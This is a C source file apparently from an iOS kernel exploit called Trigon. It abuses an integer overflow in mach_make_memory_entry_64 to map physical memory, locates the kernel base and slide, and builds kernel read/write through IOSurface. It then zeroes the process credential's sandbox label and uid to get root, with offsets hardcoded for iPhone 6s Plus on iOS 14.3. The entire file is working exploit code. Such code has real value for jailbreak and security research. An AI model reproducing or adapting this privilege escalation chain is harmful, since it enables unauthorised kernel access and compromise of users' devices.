// exploit.c
// Trigon, 2025

#include "exploit.h"
#include "info.h"
#include "memory.h"
#include "patchfinder.h"
#include "iboot-handoff.h"
#include "pv.h"
#include "surface.h"
#include "translation.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <IOSurface/IOSurfaceRef.h>

static CFNumberRef CFNUM(uint32_t value) {
    return CFNumberCreate(NULL, kCFNumberIntType, (void *)&value);
}

static int create_oob_entry(void) {
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    memory_object_size_t size = 0x30000;
    uint32_t width_height = 200;
    
    CFDictionarySetValue(dict, CFSTR("IOSurfacePixelFormat"), CFNUM((int)'ARGB'));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceWidth"), CFNUM(width_height));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceHeight"), CFNUM(width_height));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceBufferTileMode"), kCFBooleanFalse);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerRow"), CFNUM(width_height*4));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerElement"), CFNUM(4));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), CFNUM((uint32_t)size));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
    
    IOSurfaceRef surface = IOSurfaceCreate(dict);
    CFRelease(dict);
    if (surface == NULL) return -1;
    
    mach_port_t parentEntry = 0;
    mach_port_t task = mach_task_self();
    memory_object_offset_t base = (memory_object_offset_t)IOSurfaceGetBaseAddress(surface);
    memset((void *)base, 0x41, size);
    
    IOSurfaceLock(surface, 0, NULL);
    int kr = mach_make_memory_entry_64(task, &size, base, VM_PROT_DEFAULT, &parentEntry, 0);
    IOSurfaceUnlock(surface, 0, NULL);
    CFRelease(surface);
    if (kr != KERN_SUCCESS) return -1;
    
    uint64_t overflowedSize = 0x4000 - 0x8000;
    kr = mach_make_memory_entry_64(task, &overflowedSize, 0x8000, VM_PROT_DEFAULT, &gExploitEntry, parentEntry);
    mach_port_deallocate(task, parentEntry);
    if (kr != KERN_SUCCESS | gExploitEntry == MACH_PORT_NULL) {
        return -1;
    }
    return 0;
}

uint64_t findKernelPhysBase(void) {
    uint64_t kernelBase = 0x803000000;
    while (kernelBase < 0x806000000) {
        if (physread32(kernelBase) == 0xFEEDFACF) {
            printf("Found kernel base at: 0x%llx\n", kernelBase);
            return kernelBase;
        }
        kernelBase += 0x1000;
    }
    printf("Failed!\n");
    return 0;
}

uint64_t findProc(pid_t pid) {
    // hardcoded for iPhone 6s Plus iOS 14.3
    uint64_t proc = kread64(0xfffffff0077c1988 + gDeviceInfo.kernelSlide);
    while (proc != 0) {
        if (kread32(proc + 0x68) == pid) {
            return proc;
        }
        proc = kread64(proc);
    }
    return 0;
}

uint64_t trigon(void) {
    
    bool supported = false;
    info_init(&supported);
    if (!supported) {
        printf("ERROR: unsupported device/version.\n");
        return -1;
    }
    
    // Trigger the bug and create a memory of size 0xFFFFFFFFFFFFC000
    if (create_oob_entry()) {
        printf("ERROR: failed to create malicious memory entry.\n");
        return -1;
    }
    
    uint64_t handoff = 0x50000;
    uint32_t *mapped = NULL;
    for (;; handoff += pages(1)) {
        mapped = (uint32_t *)map_data_with_offset(handoff, pages(1), VM_PROT_READ);
        if (!mapped) continue;
        if (*mapped == IBOOT_HANDOFF_MAGIC) break;
        unmap_data((uint64_t)mapped, pages(1));
    }
    uint64_t handoffBase = 0;
    parse_iboot_handoff((void *)mapped, &gDeviceInfo.gPhysBase, &gDeviceInfo.gPhysSize, &handoffBase);
    unmap_data((uint64_t)mapped, pages(1));
    printf("gPhysBase: 0x%llX\n", gDeviceInfo.gPhysBase);
    printf("gPhysSize: 0x%llX\n", gDeviceInfo.gPhysSize);
    
    gMappingBase = handoffBase - handoff;
    printf("Mapping base: 0x%llX\n", gMappingBase);
    
    if (gDeviceInfo.a9) {
        printf("Finding kernel base for A9...\n");
        gDeviceInfo.kernelPhysBase = findKernelPhysBase();
    } else {
        void *amccBase = (void *)map_page(0x200000000, VM_PROT_READ);
        volatile uint32_t ktrrLowerLimit = *(volatile uint32_t *)(amccBase + gDeviceInfo.ktrrLowerLimit);
        volatile uint32_t ktrrUpperLimit = *(volatile uint32_t *)(amccBase + gDeviceInfo.ktrrUpperLimit);
        unmap_page((uint64_t)amccBase);
        
        uint64_t roRgnStart = gDeviceInfo.gPhysBase + ((uint64_t)ktrrLowerLimit << 14);
        uint64_t roRgnEnd = gDeviceInfo.gPhysBase + ((uint64_t)ktrrUpperLimit << 14);
        printf("RoRgn start: 0x%llX\n", roRgnStart);
        printf("RoRgn end: 0x%llX\n", roRgnEnd);
        
        // Find the kernel base
        for (uint64_t i = (roRgnEnd - roRgnStart); i >= 0; i -= pages(1)) {
            if (physread32(roRgnStart + i) == MH_MAGIC_64
                && physread32(roRgnStart + i + 12) == MH_EXECUTE) {
                gDeviceInfo.kernelPhysBase = roRgnStart + i;
                break;
            }
        }
    }
    
    gDeviceInfo.kernelBase = physread64(gDeviceInfo.kernelPhysBase + 0x38);
    gDeviceInfo.kernelSlide = gDeviceInfo.kernelBase - 0xFFFFFFF007004000;
    printf("Kernel base: 0x%llX\n", gDeviceInfo.kernelBase);
    printf("Kernel physical base: 0x%llX\n", gDeviceInfo.kernelPhysBase);
    printf("Kernel slide: 0x%llX\n", gDeviceInfo.kernelSlide);
    
    if (find_kernel_offsets()) {
        printf("ERROR: failed to patchfind kernel.\n");
        if (gExploitEntry) {
            mach_port_deallocate(mach_task_self(), gExploitEntry);
            gExploitEntry = MACH_PORT_NULL;
        }
        return -1;
    }
    
    uint64_t task = 0;
    int retries = 0;
    while (!task) {
        if (iosurface_krw_init(&task)) {
            printf("WARNING: failed to initialise IOSurface kernel read/write, retrying...\n");
            if (retries >= 5) {
                printf("ERROR: failed to initialise IOSurface kernel read/write after five retries, exiting.\n");
                if (gExploitEntry) {
                    mach_port_deallocate(mach_task_self(), gExploitEntry);
                    gExploitEntry = MACH_PORT_NULL;
                }
                return -1;
            }
            retries++;
        }
    }
    
    if (gExploitEntry) {
        mach_port_deallocate(mach_task_self(), gExploitEntry);
        gExploitEntry = MACH_PORT_NULL;
    }
    
    printf("kread32(0x%llX) -> 0x%X\n", gDeviceInfo.kernelBase, kread32(gDeviceInfo.kernelBase));
    
    gDeviceInfo.kernelProc = findProc(0);
    gDeviceInfo.ourProc = findProc(getpid());
    printf("Kernel proc: 0x%llX\n", gDeviceInfo.kernelProc);
    printf("Our proc: 0x%llX\n", gDeviceInfo.ourProc);
    
    // Fun
    uint64_t ourUcred = kread64(gDeviceInfo.ourProc + 0xF0);
    uint64_t ourLabel = kread64(ourUcred + 0x78);
    kwrite64(ourLabel + 0x10, 0);
    kwrite32(ourUcred + 0x20, 0);
    // Need to setuid(0) twice to properly set
    setuid(0);
    setuid(0);
    setgid(0);
    printf("UID: %u\n", getuid());
    iosurface_krw_deinit();
    return 0;
}
